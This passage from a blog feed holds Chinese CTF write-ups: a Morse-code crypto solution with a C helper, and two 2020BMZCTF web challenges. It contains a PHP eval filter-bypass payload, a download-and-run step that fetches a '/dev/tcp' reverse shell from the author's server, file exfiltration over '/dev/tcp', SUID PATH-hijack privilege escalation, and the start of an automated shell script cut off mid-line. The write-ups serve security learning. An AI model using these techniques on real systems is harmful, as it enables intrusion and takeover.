operator">//</span> KEy1<span class="token keyword">print</span><span class="token punctuation">(</span>long_tO_bytes<span class="token punctuation">(</span>IS_THis_REAl_flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>ã€Šå…³äºæˆ‘çš„è€å¸ˆçœ‹åˆ°ç›´æ¥æ°”æ­»è¿‡å»æ€ä¹ˆåŠã€‹</p><p>æ ¹æ®é¢˜ç›®æè¿°ï¼ŒæŠŠ<code>key1</code>æ›¿æ¢ä¸º<code>Do you want a DaJiBei?</code></p><p>è°ƒæ•´å¥½æ ¼å¼è·‘ä¸€éï¼Œå¾—åˆ°<code>thrEE_means_3</code>ï¼Œå°è¯•å„ç§å•è¡¨åŠ å¯†å‡æ— æœï¼Œæ ¹æ®hint4ï¼Œå¯¹åŸå§‹æ–‡ä»¶è¿›è¡Œå°è¯•è¿˜æ˜¯æ— æœï¼Œæœ€åæ¯”èµ›å¿«ç»“æŸäº†ï¼Œæ”¾å‡ºç›´æ¥æç¤ºhint5ï¼Œå°è¯•å°†å…¨ç¯‡å°å†™è½¬æ¢ä¸º<code>.</code>ï¼Œå¤§å†™è½¬æ¢ä¸º<code>-</code>è§£å¯†ï¼Œå‘ç°æ‘©æ–¯å¯†ç è¡¨å¹¶ä¸æ˜¯å›ºå®šä½æ•°ï¼Œæ€•æ˜¯è¦çˆ†ç ´æ’åˆ—ç»„åˆï¼Œæ”¾å¼ƒäº†ã€‚</p><p>èµ›åå‡ºé¢˜äºº @cheyenne æŒ‡ç‚¹ï¼Œæœ¬é¢˜æ‘©æ–¯å¯†ç ç»Ÿä¸€é‡‡ç”¨äº”ä½ä¸€ç»„ï¼Œç”±æ€»æ•°ä¸º245ä½å¯å¾—ã€‚</p><p>ç”±äºæœ¬äººpythonæ­£åœ¨è‡ªå­¦æ°´å¹³ä¸€èˆ¬ï¼Œå¥—ç”¨ä¹‹å‰å†™è¿‡çš„ä¸€å¥—Cçš„æ›¿æ¢ç¨‹åº</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/*@Time ï¼š 2021/1/24 13:58@Auth ï¼š gyy@Blog ï¼šhttp://err0r.top*/</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> n<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">void</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>FILE <span class="token operator">*</span>fpw<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> c<span class="token punctuation">,</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token operator">=</span>str<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token operator">>=</span><span class="token string">'A'</span><span class="token operator">&amp;&amp;</span>c<span class="token operator">&lt;=</span><span class="token string">'Z'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>n<span class="token operator">++</span><span class="token punctuation">;</span><span class="token function">fputc</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token operator">>=</span><span class="token string">'a'</span><span class="token operator">&amp;&amp;</span>c<span class="token operator">&lt;=</span><span class="token string">'z'</span><span class="token punctuation">)</span>       <span class="token punctuation">&#123;</span>       n<span class="token operator">++</span><span class="token punctuation">;</span>       <span class="token function">fputc</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       <span class="token keyword">else</span>       <span class="token keyword">continue</span><span class="token punctuation">;</span>       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">%</span><span class="token number">5</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token function">fputc</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>FILE <span class="token operator">*</span>fpr<span class="token punctuation">,</span><span class="token operator">*</span>fpw<span class="token punctuation">;</span><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fpr<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"py"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can't open!'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fpw<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can't write!'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">,</span>fpr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token function">write</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è°ƒç”¨å‡½æ•°</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fpr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æµ“æµ“çš„èœé¸¡å‘³~ï¼Œè·‘å‡ºç»“æœ</p><pre class="language-none"><code class="language-none">.---- ----- ..--- .---- ----- ---.. ----. --... .---- ----- ...-- .---- ..--- ...-- ---.. ...-- -.... ----. ---.. -.... .---- ----- .---- .---- .---- ----- ----. ..... .---- ----- ----. .---- ----- .---- ----. --... .---- .---- ----- .---- .---- ..... ----. ..... ..... -.... .---- ..--- .....</code></pre><p>æ‹¿å»è§£å¯†å¾—</p><pre class="language-none"><code class="language-none">1021089710312383698610111095109101971101159556125</code></pre><p>çœ‹åˆ°asciiç <code> 102 108 97 103</code>ç«‹é©¬èµ·äº†ååº”ï¼Œè¿™æ˜¯<code>flag</code>çš„asciiç ï¼Œæ‰€ä»¥æ˜¯æ¯ä¸¤ä¸ªæˆ–ä¸‰ä¸ªç»„åˆæˆä¸€ä¸ªå­—ç¬¦</p><pre class="language-none"><code class="language-none">102 108 97 103 123 83 69 86 101 110 95 109 101 97 110 115 95 56 125</code></pre><p>æœ€åå¾—åˆ°flagï¼š<code>flag&#123;SEVen_means_8&#125;</code></p><p>æ— é™æ¥è¿‘ç­”æ¡ˆï¼Œä½†å¯†ç å­¦çˆ·çˆ·å¤ªå¼ºäº†å‘œå‘œå‘œ</p><hr><p>æœ‰äº›æ”¶è·å§ï¼Œå¦‚æœ‰é—®é¢˜å¸Œæœ›å¤§ä½¬ä»¬æ–§æ­£ã€‚2021ä¸€èµ·å­¦ä¹ ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021</title>
      <link href="article/2021/"/>
      <url>article/2021/</url>
      
        <content type="html"><![CDATA[<p align="center">å±•æœ›2021</p><a id="more"></a>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2020BMZctf-Writeup</title>
      <link href="article/bmzctf2020/"/>
      <url>article/bmzctf2020/</url>
      
        <content type="html"><![CDATA[<h2 id="2020BMZCTF-Write-up"><a href="#2020BMZCTF-Write-up" class="headerlink" title="2020BMZCTF Write-up"></a>2020BMZCTF Write-up</h2><p>éšç¼˜åšäº†ä¸¤é“web</p><p>æ˜µç§°ï¼šErr0r</p><a id="more"></a><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="WEB-ezeval"><a href="#WEB-ezeval" class="headerlink" title="WEB_ezeval"></a>WEB_ezeval</h4><p>æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$black_list</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'php'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'echo'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'`'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'preg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'server'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'chr'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'decode'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'html'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'md5'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'post'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'get'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'session'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ascii'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'eval'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'replace'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'assert'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'exec'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'cookie'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'$'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'include'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'print'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'scan'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'decode'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'system'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'func'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ini_'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'passthru'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'pcntl'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'open'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'link'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'log'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'current'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'local'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'require'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'contents'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$black_list</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"BMZCTF"</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>banäº†ä¸€å †å‡½æ•°ï¼Œä½†è‚¯å®šè¿˜æœ‰èƒ½ç”¨çš„ï¼Œ<code>&lt;ã€&gt;ã€&quot;</code>å› ä¸º<code>htmlspecialchars</code>ä¹Ÿæ˜¯ä¸èƒ½ç”¨çš„</p><p>å¾€æ— å‚æ•°RCEæ–¹å‘èµ°å‘ç°ä¸å¤ªå¯è¡Œï¼Œæœ€ååˆ©ç”¨<code>base_convert</code>æ„é€ è¯­å¥</p><p>æŠŠ<code>system</code>ç”±base36è½¬ä¸ºbase10ï¼Œåˆ©ç”¨<code>base_convert(2146934604002,10,36)</code>å‘ç°å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œäºæ˜¯æƒ³è¯»å–æ ¹ç›®å½•flagå‘ç°<code>/</code>ä¼ ä¸è¿›å»ï¼Œäºæ˜¯ç»§ç»­<code>base_convert(16191,10,36)</code>ï¼Œåˆ©ç”¨<code>chr</code>å‡½æ•°è½¬æ¢<code>/</code>ï¼Œæœ€ç»ˆè¯»å–flag</p><p>payloadï¼š<code>cmd=base_convert(2146934604002,10,36)(base_convert(16191,10,36)(47).flag);</code></p><img src="/article/bmzctf2020/image-20201228205633315.png" class="" title="image-20201228205633315" loading="lazy"><hr><h4 id="WEB-penetration"><a href="#WEB-penetration" class="headerlink" title="WEB_penetration"></a>WEB_penetration</h4><p>ä¸»è¦è€ƒå¯Ÿåå¼¹shellï¼Œææƒ</p><p>æ‰“å¼€å¾—æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$_</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'d'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'e'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'-'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'q'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'f'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'g'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'i'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'p'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'j'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'+'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'k'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'m'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'n'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\&lt;'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\>'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'o'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'w'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'x'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\~'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\:'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\^'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\@'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\&amp;'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\''</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\%'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\"'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\*'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\('</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\)'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\!'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\='</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\.'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\['</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\]'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\&#125;'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\&#123;'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blacklisted</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match <span class="token punctuation">(</span><span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blacklisted</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/im'</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"long"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>å‘½ä»¤æ‰§è¡Œï¼Œ<code>ip</code>ç»è¿‡blacklistè¿‡æ»¤åexecæ‰§è¡Œï¼Œä½†æ˜¯æµ‹ç€å‘ç°foreachä¼šæ¯æ¬¡å–ä¸€ä½ç„¶åæ¥æ‰§è¡Œï¼Œæ‰§è¡Œå¤šæ¬¡ï¼Œä¹Ÿå°±æ˜¯è¯´åªè¦ä¸å«<code>b</code>å°±å¯ä»¥æ‰§è¡Œï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥æ‰§è¡Œï¼Œä½†é™åˆ¶äº†18ä¸ªå­—ç¬¦çš„é•¿åº¦é™åˆ¶å‘æŒ¥ï¼Œå°è¯•åå¼¹shellï¼Œæ˜æ˜¾åå¼¹shellç¬¬ä¸€ä¸ªå•è¯<code>bash</code>ä¼šè¢«è¿‡æ»¤ï¼Œå¦å¯»æ–¹æ³•ã€‚</p><p>é¦–å…ˆå°±æ‰§è¡Œ<code>find / -name fl*&gt;1</code>ï¼Œæ‰§è¡Œåè¾“å‡ºç»“æœåˆ°æ–‡ä»¶1ï¼Œç»“æœå‘ç°æ ¹æœ¬å°±æ²¡æœ‰flagï¼</p><p>æµ‹è¯•echoå¯å†™ï¼Œäºæ˜¯å‡†å¤‡å†™ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œç»“æœå‘ç°å†™çš„.phpä¸æ‰§è¡Œï¼Œåº”è¯¥æ˜¯å†™äº†è§„åˆ™ã€‚</p><p>äºæ˜¯å‡†å¤‡å†™ä¸ª<code>.htaccess</code>ï¼Œç»“æœä¸€å†™ç›´æ¥500å†…éƒ¨æœåŠ¡æŠ¥é”™ã€‚</p><p>è€å®å¼¹shellå§ã€‚</p><p>æƒ³ç›´æ¥å†™<code>bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1</code>ï¼Œç»“æœå‘ç°<code>&amp;</code>å†™ä¸è¿›å»ï¼Œæµ‹è¯•å‘ç°é¶æœºå¯è¿å¤–ç½‘ï¼Œäºæ˜¯åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šå†™ä¸ªåä¸º1çš„æ–‡ä»¶ï¼Œå†…å®¹ä¸º<code>bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1</code></p><p>å†åœ¨é¶æœºå†™ä¸ªæ–‡ä»¶<code>1d</code>ï¼Œå†…å®¹ä¸º<code>curl ip/1&gt;1</code></p><p>è¿è¡Œ<code>sh 1d</code>ï¼Œå‘ç°ä¸è¡Œï¼Œä¼°è®¡æ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œèµ‹äºˆï¼Œ<code>chmod 777 1d</code>ï¼Œé¶æœºè¿è¡Œäº†curlå‘½ä»¤ï¼Œè®¿é—®æˆ‘çš„æœåŠ¡å™¨ä¸‹è½½äº†æ–‡ä»¶1ï¼Œè¿™æ ·å°±æˆåŠŸå†™äº†åå¼¹shellçš„å‘½ä»¤</p><p>åœ¨æˆ‘çš„æœåŠ¡å™¨ç›‘å¬ç«¯å£ï¼Œ<code>nc -lvp [port]</code></p><p>å†ç»™1èµ‹äºˆæ‰§è¡Œæƒé™<code>chmod 777 1</code>ï¼Œéœ€è¦ç”¨bashæ‰§è¡Œï¼Œå¯æ˜¯ä¸å¯ä»¥å«æœ‰<code>b</code>ï¼Œäºæ˜¯åˆ©ç”¨<code>?</code>å’Œ<code>[a-c]</code>ï¼Œå³æ‰§è¡Œ<code>/?in/[a-c]ash 1</code></p><p>æˆ‘çš„æœåŠ¡å™¨æˆåŠŸgetshell</p><img src="/article/bmzctf2020/image-20201228211635023.png" class="" title="image-20201228211635023" loading="lazy"><p>æ ¹ç›®å½•ä¸‹æ²¡æœ‰å‘ç°flagï¼Œä¹Ÿæ²¡æœ‰readflagï¼Œæ‰¾ä¹Ÿæ‰¾ä¸åˆ°flagï¼Œæœ‰ä¸ª<code>start.sh</code>ï¼Œè¯»å–ä¸€ä¸‹çœ‹çœ‹</p><pre class="language-sh" data-language="sh"><code class="language-sh">www-data@2a4c1fe2f663:&#x2F;var&#x2F;www&#x2F;html$ cat &#x2F;start.shcat &#x2F;start.sh#!&#x2F;bin&#x2F;bash chmod 755 index.phpgcc &#x2F;root&#x2F;demo.c -o lovemv love &#x2F;usr&#x2F;bin&#x2F;lovechmod u+s &#x2F;usr&#x2F;bin&#x2F;loverm &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.logrm &#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log</code></pre><p>å…³é”®åœ¨è¿™ä¸ª<code>/user/bin/love</code></p><p>è¯»å‡ºæ¥çœ‹çœ‹ï¼ŒæœåŠ¡å™¨å¼€ç›‘å¬ç«¯å£ï¼Œé¶æœºshellæ‰§è¡Œ<code>cat /usr/bin/love &gt; /dev/tcp/[ip]/[port]</code></p><img src="/article/bmzctf2020/image-20201228212753119.png" class="" title="image-20201228212753119" loading="lazy"><p>æˆåŠŸæ‹¿åˆ°æ–‡ä»¶ï¼Œæ‹·ä¸‹æ¥åç¼–è¯‘ä¸€ä¸‹(webç‹—æ±—é¢œ)</p><img src="/article/bmzctf2020/image-20201228212718787.png" class="" title="image-20201228212718787" loading="lazy"><p>ç»“æœå°±æ˜¯ç³»ç»Ÿæ‰§è¡Œä¸ªpså‘½ä»¤</p><p>ç»“åˆfindå‘ç°äº†çš„ä¸€ç‚¹ä¸œè¥¿</p><img src="/article/bmzctf2020/image-20201228211807363.png" class="" title="image-20201228211807363" loading="lazy"><p><code>/root</code>ç›®å½•æ²¡æœ‰æƒé™ï¼Œä¹Ÿè®¸å¯èƒ½è€ƒç‚¹å°±æ˜¯ææƒäº†</p><p>è¿™æ˜¯ä¸€ä¸ªå…·æœ‰SUIDæƒé™çš„ç¨‹åºï¼Œåœ¨tmpç›®å½•å†™ä¸ªå†…å®¹ä¸º<code>/bin/bash</code>çš„psæ–‡ä»¶ï¼Œæ·»åŠ è¿›ç¯å¢ƒå˜é‡ï¼Œè¿™æ ·æ‰§è¡Œç¨‹åºè°ƒç”¨pså‘½ä»¤ä¼šä¼˜å…ˆä»è¿™é‡Œæ‰§è¡Œï¼Œè€Œè¿™é‡Œæ˜¯æˆ‘ä»¬ä¼ªé€ çš„pså‘½ä»¤ï¼Œç„¶åç›¸å½“äºä»¥é«˜çº§æƒé™æ‰§è¡Œäº†<code>/bin/bash</code>ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"/bin/bash"</span> <span class="token operator">></span> /tmp/ps<span class="token function">chmod</span> <span class="token number">777</span> <span class="token function">ps</span><span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>.:<span class="token environment constant">$PATH</span>/usr/bin/love</code></pre><p>æˆåŠŸææƒï¼Œç›´æ¥<code>cat /root/flag</code></p><img src="/article/bmzctf2020/image-20201228213633573.png" class="" title="image-20201228213633573" loading="lazy"><p>ç†è§£äº†å¸ˆå‚…ä¹‹å‰è¯´çš„ï¼Œææƒï¼Œæ‰æ˜¯å¼€å§‹ã€‚</p><p>æ˜¯çš„ï¼Œæƒé™çœŸé¦™ï¼Œè¿™æ‰åˆšåˆšå¼€å§‹</p><p>åé¢å†ç ”ç©¶å§</p><p>é™„ä¸Šä¸€é”®å¼¹shellè„šæœ¬ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ï¼š 2020/12/26 20:36@Auth ï¼š gyy@Blogï¼šhttp://err0r.top"""</span><span class="token keyword">import</span> requestsbaseurl <span class="token operator">=</span> <span class="token string">"http://www.bmzclub.cn:21257/"</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">execit</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?ip="</span><span class="token operator">+</span>payload    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"long"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    payload1 <span class="token 